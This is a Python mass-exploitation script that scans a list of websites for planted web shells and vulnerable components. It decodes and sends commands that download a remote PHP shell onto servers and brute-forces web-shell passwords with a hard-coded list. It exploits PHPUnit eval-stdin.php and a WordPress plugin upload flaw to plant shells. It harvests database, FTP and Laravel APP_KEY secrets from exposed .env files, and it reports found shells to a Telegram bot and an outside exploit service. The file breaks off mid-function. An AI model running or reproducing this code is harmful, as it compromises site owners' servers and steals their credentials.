import os,requests,random,threading,time,sys,ctypes,re,urllib3,itertools
from multiprocessing.dummy import Pool,Lock
from requests import post
from bs4 import BeautifulSoup
from random import choice
from colorama import Fore,Style,init
init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
Folder('result')

urllib3.disable_warnings()
Good = 0
x = requests.session()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path =  str(sys.argv[0]).split('\\')
    exit('\n  [!] python '+path[len(path)-1]+' list.txt')

def alfa(i) :
    global Good
    x = requests.session()
    head={
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }
    listaa = ['/alfacgiapi','/ALFA_DATA/alfacgiapi','/wp-content/alfacgiapi','/wp-content/ALFA_DATA/alfacgiapi''/wp-content/uploads/alfacgiapi','/wp-content/uploads/ALFA_DATA/alfacgiapi','/wp-content/plugins/alfacgiapi','/wp-content/plugins/ALFA_DATA/alfacgiapi','/wp-content/themes/alfacgiapi','/wp-content/themes/ALFA_DATA/alfacgiapi','/wp-content/upgrade/alfacgiapi','/wp-content/upgrade/ALFA_DATA/alfacgiapi','/wp-content/updraft/alfacgiapi','/wp-content/updraft/ALFA_DATA/alfacgiapi','/wp-content/plugins/cekidot/alfacgiapi','/wp-content/plugins/cekidot/ALFA_DATA/alfacgiapi','/wp-content/plugins/library/alfacgiapi','/wp-content/plugins/library/ALFA_DATA/alfacgiapi','/wp-admin/alfacgiapi','/wp-admin/ALFA_DATA/alfacgiapi','/wp-includes/alfacgiapi','/wp-includes/ALFA_DATA/alfacgiapi','/.well-known/alfacgiapi','/.well-known/ALFA_DATA/alfacgiapi','/.well-known/acme-challenge/alfacgiapi','/.well-known/acme-challenge/ALFA_DATA/alfacgiapi','/.well-known/pki-validation/alfacgiapi','/.well-known/pki-validation/ALFA_DATA/alfacgiapi','/.tmb/alfacgiapi','/.tmb/ALFA_DATA/alfacgiapi','/.quarantine/alfacgiapi','/.quarantine/ALFA_DATA/alfacgiapi','/cgi-bin/alfacgiapi','/cgi-bin/ALFA_DATA/alfacgiapi','/images/alfacgiapi','/images/ALFA_DATA/alfacgiapi','/components/alfacgiapi','/components/ALFA_DATA/alfacgiapi','/wordpress/alfacgiapi','/wordpress/ALFA_DATA/alfacgiapi','/wp/alfacgiapi','/wp/ALFA_DATA/alfacgiapi','/blog/alfacgiapi','/blog/ALFA_DATA/alfacgiapi','/new/alfacgiapi','/new/ALFA_DATA/alfacgiapi','/old/alfacgiapi','/old/ALFA_DATA/alfacgiapi','/backup/alfacgiapi','/backup/ALFA_DATA/alfacgiapi','/v1/alfacgiapi','/v1/ALFA_DATA','/user/ALFA_DATA','/users/alfacgiapi','/backup/alfacgiapi','/images/alfacgiapi','/css/alfacgiapi','/js/ALFA_DATA','/js/alfacgiapi','/img/alfacgiapi','/admin/alfacgiapi','/vendor/ALFA_DATA']
    for xox in listaa :
        try :
            url = ("http://"+i+xox+"/perl.alfa")
            url2 = ("http://"+i+xox+"/bash.alfa")
            url3 = ("http://"+i+xox+"/py.alfa")
            check = ("http://"+i+xox+"/index.php")
            check2 = ("http://"+i+xox+"/radio.php")
            check3 = ("http://"+i+xox+"/404.php")
            x.post(url, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HQU1FQlVZSUsvYS9tYWluL292ZXIucGhw'}, timeout=15)
            x.post(url, headers=head, data={'cmd': 'Y3VybCAtTHMgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HQU1FQlVZSUsvYS9tYWluL292ZXIucGhwIHwgdGVlIC1hIGluZGV4LnBocA=='}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'd2dldCAtcU8gcmFkaW8ucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HQU1FQlVZSUsvYS9tYWluL292ZXIucGhw'}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR0FNRUJVWUlLL2EvbWFpbi9vdmVyLnBocCAtbyByYWRpby5waHA='}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'Y3VybCAtTHMgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HQU1FQlVZSUsvYS9tYWluL292ZXIucGhwIHwgdGVlIC1hIDQwNC5waHA='}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'd2dldCAtcU8gNDA0LnBocCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR0FNRUJVWUlLL2EvbWFpbi9vdmVyLnBocA=='}, timeout=15)
            req1 = x.get(check, headers=head, timeout=15)
            if "OvrThnkr1337" in req1.text :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("result/shell.txt","a").write(check+"\n")
                break
            req2 = x.get(check2, headers=head, timeout=15)
            if "OvrThnkr1337" in req2.text :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("result/shell.txt","a").write(check2+"\n")
                break
            req3 = x.get(check3, headers=head, timeout=15)
            if "OvrThnkr1337" in req3.text :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("result/shell.txt","a").write(check3+"\n")
                break
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found ALFA RCE")
        except :
            pass
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW('HaxorWorld | Shell - {}'.format(Good))
        else :
            sys.stdout.write('\x1b]2; HaxorWorld | Shell - {}\x07'.format(Good))

def kcf(i) :
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/admin/kcfinder/upload.php','/js/kcfinder/upload.php','/assets/admin/kcfinder/upload.php','/kcfinder/upload.php','/assets/js/kcfinder/upload.php','/admin/assets/js/ckeditor/kcfinder/upload.php','/ckeditor/plugins/kcfinder/upload.php']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            req_first = x.get(url, headers=head)
            if 'alert("Unknown error");' in req_first.text :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found KCFinder")
                open("result/kcfinder.txt","a").write(url+"\n")
                break
            elif "alert('Unknown error');" in req_first.text :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found KCFinder")
                open("result/kcfinder.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found KCFinder")
        except :
            pass

def debug(i) :
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/_ignition/execute-solution']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            req_first = x.get(url, headers=head, timeout=15, verify=False)
            if "MethodNotAllowedHttpException" in req_first.text :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Debug")
                open("result/debugrce.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Debug")
        except :
            pass

def rfm(i) :
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/filemanager/dialog.php','/assets/administrator/filemanager/dialog.php','/assets/admin/js/filemanager/dialog.php','/assets/plugins/filemanager/dialog.php','/assets/filemanager/dialog.php','/admin/tinymce/plugins/filemanager/dialog.php']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            req_first = x.get(url, headers=head)
            if "Responsive FileManager" in req_first.text :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found RFM")
                open("result/RFM.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found RFM")
        except :
            pass

def wpins(i) :
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/wp-admin/install.php','/wp/wp-admin/install.php','wordpress/wp-admin/install.php','blog/wp-admin/install.php','new/wp-admin/install.php','test/wp-admin/install.php','old/wp-admin/install.php','backup/wp-admin/install.php']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            req_first = x.get(url, headers=head)
            if "<title>WordPress &rsaquo; Setup Configuration File</title>" and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req_first.text :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found WpSetup")
                open("result/WpSetUp.txt","a").write(url+"\n")
                break
            elif "<title>WordPress &rsaquo; Installation</title>" and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req_first.text :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found WpInstall")
                open("result/WpInstall.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found WPI/WPS")
        except :
            pass

def rsf(i) :
    global Good
    x = requests.session()
    head = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
    'referer': 'www.google.com'}
    try :
        listaa = ['wp-backup-sql-302.php','0.php','0byte.php','0x0.php','0z.php','1.php','13.php','1945.php?login=1945','1975Team.php?shell=Dead','1index.php?pass=shell','22xc.php','26.php','2index.php?pass=shell','3.php','32.php','3index.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','403.php','404.php','45.php','4x4.php','73.php','a.php','abc.php','about.php','admin.php','al.php','alf.php','alf4.php','alfa-ioxi.php','alfa-shell-v4.php','alfa.php','alfakun.php','alfatesla.php','bunga.php','kon.php','lampu.php','jadikaya.php','rush.php','wol.php.shizu.php','data.php','lock.php','cnshell.php','be7ak.php','alfav.php','alfashell.php','foxxx.php','crl.php','error7.php','byp7.php','bypass.php','header.php','logout.php','yahahaha.php','usd.php','slot.php','goblok.php','jancok.php','wp-content.php','wp-admin.php','shizuka.php','fire.php','lord.php','local.php','1337.php','d7.php','ui.php','fxshell.php','fx.php','pirja.php','kaca.php','kayu.php','options.php','option.php','404.php','500.php','200.php','1.php','2.php','3.php','4.php','5.php','6.php','7.php','8.php','9.php','10.php','11.php','12.php','13.php','14.php','16.php','17.php','18.php','19.php','20.php','21.php','22.php','23.php','24.php25.php','26.php','27.php','28.php','29.php','30.php','31.php','rooting.php','bc.php','connect.php','soto.php','kuda.php','naga.php','draw.php','dragon.php','alfateslav4.php','alwso.php','anjay.php','anon.php','anons79.php','autoload_classmap.php','base.php','batm.php','bj.php','black.php','by.php','byp.php','bypass.php','byps.php','c.php','ccaef.php','chitoge.php','con.php','con7.php','css.php','dbx.php','defau1t.php','degeselih.php','doc.php','docindex.php','dosya.php','Dz.php','e.php','error.php?phpshells','evil.php','file.php','fox.php','FoxWSO-full.php','FoxWSO.php','foxwso.php','fw.php','gank.php','gank.php.PhP','gel4y.php','gelay.php','gh.php','i.php','id.php','ids.php','idx.php','indoxploit.php','init.php','k.php','kepo.php','kk.php','kndw1.php','la.php','lnedx.php','loader/ff.php?pass=shell','local.php','lol.php','lolzk.php','m.php','mar.php','marijuana.php','mas.php','mass.php','mclash.php','mini.php','minik.php','minishell.php','mrjn.php','n.php','new-index.php','ninja.php','o.php','ohayo.php','old-index.php?daksldlkdsadas=1','olux.php','phpinfo.php?re@=vo@','postfs.php','pref.php','priv.php','priv8.php','public/anons79.php','qindex.php','r.php','r57.php','radio.php?pass=shell','rex.php','s.php','shell.php','shell20211028.php','shells.php','sql.php','stupid.php','sym.php','sys.php','t.php','tes.php','tesla,php','teslav.php','test.php','tshop.php','twin.php','u.php','upload.php','uploader.php','ups.php','usb.php','usr.php','utchiha.phP','v.php','v3.php','v4.php','vuln.php','wikindex.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','wp-2019.php','wp-admin.php','wp-atom.php','wp-bita.php?encoded=shell','wp-conflg.php','wp-content/mu-plugins-old/index.php','wp-ctac.php?encoded=shell','wp-defaul.php','wp-hmdra.php?encoded=shell','wp-iav.php?encoded=shell','wp-includes/wp-class.php','wp-info.php','wp-inlcudes.php?katib','wp-installer.php','wp-js.php?phpshells','wp-load.php?daksldlkdsadas=1','wp-mails.php','wp-one.php','wp-pluging.php','wp-plugins.php','wp-rss.php','wp-singupp.php','wp-site.php','wp-system.php','wp-title.php','wp-we.php','wp.php','wpindex.php','wp_wrong_datlib.php','ws.php','WSO.php','wso.php','wso1.php','wso1337.php','wso2.php','x.php','xcv.php','xidcm.php','xindex.php','xl.php','xleet.php','xm.php','devil.php','rocker.php','dev.php','xx.php','XxX.php','xxx.php','y.php','z.php','zk.php','zone.php?phpshell','zx.php']
        for xox in listaa :
            url = ("http://"+i+"/"+xox)
            url2 = ("https://"+i+"/"+xox)
            req = x.get(url, headers=head, timeout=7, verify=False).text
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shellpw.txt","a").write(url+"\n")
                listpw = ['','*****','zoromemek','konslet','sumiyati','kronkz','netcat','anying1337','ignite','Lewster1337','shizuosec','aku ganteng','kontol25','pongo@721!!','kotolok','Qwerty@1337','ara','mrmad321@A','1337haxor','Lokhtong','l o l','andika21','MMG7','anjinganjingkauanjing@#@#','burungMerpati999@*yesterday*@!!!!(!)','022627raflixsec','12qwaszx','1337','133721','1n73ction','22XC','404','555','731','a5e8z77','abcder','achan','admin','adminhoki','aerul','akudimana','alfa','am*guAW8.ryDgz-TYF','anggie21','AnonymousFox','asdsdggenu','awokawok2','b3t4kun','BangPat?1337','banyumas','bheart2206','cantik','cmonqwe123#@!','con7extshell','cyb3r','DapsquaD','DeadSec','default','elena','G00DV1N','geronimo123','gfus','ghost287','HACKED','hacker0882','hackmeDON','Hasilhoki','haurgeulis','huypizdaprovoda','hxr1337','iamtheking','IndexAttacker','IndoSec','IndoXploit','JH23FVDG32FD','jupiter2709','katib','kem','kontolcokasu','kontolgaceng','kontoll471','kpxwbYBP4hQK','l o l','leksak98@','memes','mini-shell','Mo2a0123','mravast','myrepublic','oppaidragon','password','peler','peler666','Penolong40','phpshell','phpshells','pucek12345','r00t','r00tsh3ll','rbbd95','root','root@kudajumping','Sandra@1199','stusa','Stusa','sys123','T1KUS90T','tbl','thopik123','tunafeesh','w0rms','xleet','zaza','zeeblaxx','{ IndoSec }']
                for pw in listpw :
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    if "-rw-r--r--" in cek or ">File manager<" in cek or ">Upload file:" in cek or "drwxr-xr-x" in cek or "-rw-rw-rw-" in cek or "drwxrwxrwx" in cek or "Upload File :" in cek or "Writeable" in cek :
                        print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Pass Shell")
                        open("result/shell.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Pass Shell")
                break
            elif ">File manager<" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                x.post('https://api.telegram.org/bot7033762052:AAFAOXONg97_5nntOQ1cOkzXm8j1hv7In5Q/sendMessage?chat_id=-4158297741&text='+url)
                open("result/shell.txt","a").write(url+"\n")
            elif ">Upload file:" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "RevoLutioN Namesis" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "PHP Uploader -" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif 'value="Upload"></form>' in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif '<title>[ RC-SHELL' in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif '<option value="create_symlink">' in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "Vuln!! patch it Now!" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "WSO 4.2.5<" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "(Writeable)" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "blackpanther1337" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "-rw-r--r--" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "drwxr-xr-x" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "-rw-rw-rw-" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "drwxrwxrwx" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "Owner/Group" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif ">[ Home Shell ]<" in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            elif "Upload File : " in req :
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shell.txt","a").write(url+"\n")
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Shell")
    except :
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('HaxorWorld | Shell - {}'.format(Good))
    else :
        sys.stdout.write('\x1b]2; HaxorWorld | Shell - {}\x07'.format(Good))

def dzs(i) :
    global Good
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['wp-content/plugins/dzs-zoomsounds','wp/wp-content/plugins/dzs-zoomsounds','wordpress/wp-content/plugins/dzs-zoomsounds','blog/wp-content/plugins/dzs-zoomsounds','new/wp-content/plugins/dzs-zoomsounds','test/wp-content/plugins/dzs-zoomsounds','old/wp-content/plugins/dzs-zoomsounds','backup/wp-content/plugins/dzs-zoomsounds']
    for path in listaa :
        try :
            url = ("http://"+i+"/"+path+"/savepng.php?location=1877.php")
            url2 = ("http://"+i+"/"+path+"/1877.php")
            req_first = x.get(url, headers=head)
            if "error:http raw post data does not exist" in req_first.text :
                burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close"}
                burp0_data = "<?php\r\nerror_reporting(0);\r\necho(base64_decode(\"T3ZlcnRoaW5rZXIxODc3Ijxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnbmFtZT0nZicgLz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI=\"));\r\n@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);\r\necho(\"<a href=\".$_FILES['f']['name'].\">\".$_FILES['f']['name'].\"</a>\");\r\n?>"
                x.post(url, headers=burp0_headers, data=burp0_data, timeout=45, verify=False)
                req_second = x.get(url2, headers=head)
                if "Overthinker1877" in req_second.text :
                    Good = Good + 1
                    print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found DZS")
                    open("result/shell.txt","a").write(url2+"\n")
                    break
                else :
                    print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Vuln RCE DZS")
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found DZS")
        except :
            pass
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW('HaxorWorld | Shell - {}'.format(Good))
        else :
            sys.stdout.write('\x1b]2; HaxorWorld | Shell - {}\x07'.format(Good))

def phpunit(i) :
    global Good
    head = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try :
        x = requests.session()
        listaa = ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php']
        for xox in listaa :
            url = ("http://"+i+xox)
            data = "<?php phpinfo(); ?>"
            cmd = x.get(url, data=data, timeout=15, verify=False)
            if "PHP License as published by the PHP Group" in cmd.text :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Phpunit")
                open("result/phpunit.txt","a").write(url+"\n")
                data2 = "<?php system('rm .htaccess') ?>"
                x.get(url, data=data2, timeout=15, verify=False)
                data3 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dBTUVCVVlJSy9hL21haW4vb3Zlci5waHAiLCJpbmRleC5waHAiKSkgewoJZWNobyAiT3ZyVGhua3IxMzM3IjsKfSBlbHNlIHsKCWVjaG8gImZhaWwiOwp9Cj8+')); ?>"
                x.get(url, data=data3, timeout=15, verify=False)
                data4 = "<?php system('wget -O index.php https://raw.githubusercontent.com/oxygencall/shell/main/start.php');"
                x.get(url, data=data4, timeout=15, verify=False)
                data5 = "<?php system('curl https://raw.githubusercontent.com/oxygencall/shell/main/start.php -o index.php');"
                x.get(url, data=data5, timeout=15, verify=False)
                url2 = ("http://"+i+xox+"/index.php")
                spawn = x.get(url2, headers=head)
                if "OvrThnkr1337" in spawn.text:
                    Good = Good + 1
                    print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Phpunit Shell")
                    open("result/shell.txt","a").write(url2+"\n")
                else :
                    print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Vuln Phpunit")
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Phpunit")
    except :
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('HaxorWorld | Shell - {}'.format(Good))
    else :
        sys.stdout.write('\x1b]2; HaxorWorld | Shell - {}\x07'.format(Good))

def env(i) :
    global Good
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    try :
        url = ("http://"+i+"/.env")
        req_first = x.get(url, headers=head, timeout=7, verify=False)
        if "APP_KEY" in req_first.text :
            print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ENV")
            open("result/env.txt","a").write(url+"\n")
            http = x.get(url, headers=head, timeout=7, verify=False).text
            getApp = re.findall('APP_KEY=base64:(.*?)\n', http)
            check = {
            'target': i,
            'key': getApp[0],
            'autoshell': 'Auto+Upload+Shell'
            }
            xurl = 'https://exploit.anons79.com'
            upShell = x.post(xurl, data=check, headers=head, verify=False).text
            cekShell = re.findall("""<a href='(.*?)' target='_blank'>""", upShell)
            if cekShell:
                Good = Good + 1
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found APPKEY RCE")
                open('result/shell.txt', 'a').write("http://"+cekShell[0]+"\n")
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found APPKEY")
            op = x.get(url, headers=head, timeout=7, verify=False)
            if 'DB_PASSWORD=' in op.text:
                dbuser = str(re.findall('DB_USERNAME=(.*)', op.text)[0]).split("''")[0]
                dbpass = str(re.findall('DB_PASSWORD=(.*)', op.text)[0]).split("''")[0]
                dbname = str(re.findall('DB_DATABASE=(.*)', op.text)[0]).split("''")[0]
                dbhost = str(re.findall('DB_HOST=(.*)', op.text)[0]).split("''")[0]
                if 'localhost' in dbhost or '127.0.0.1' in dbhost:
                    print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found DBN")
                else: 
                    print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found DBN")
                    open("result/db_no_localhost.txt","a").write('{}\n'.format(url)+'HOST: {}\n'.format(dbhost)+'USER: {}\n'.format(dbuser)+'PASS: {}\n'.format(dbpass)+'NAME: {}\n\n'.format(dbname))
            op = x.get(url, headers=head, timeout=7, verify=False)
            if 'FTP_USER=' in op.text or 'FTP_PASS=' in op.text:
                ftpuser = str(re.findall('FTP_USER=(.*)', op.text)[0]).split("''")[0]
                ftppass = str(re.findall('FTP_PASS=(.*)', op.text)[0]).split("''")[0]
                ftphost = str(re.findall('FTP_HOST=(.*)', op.text)[0]).split("''")[0]
                ftpport = str(re.findall('FTP_PORT=(.*)', op.text)[0]).split("''")[0]
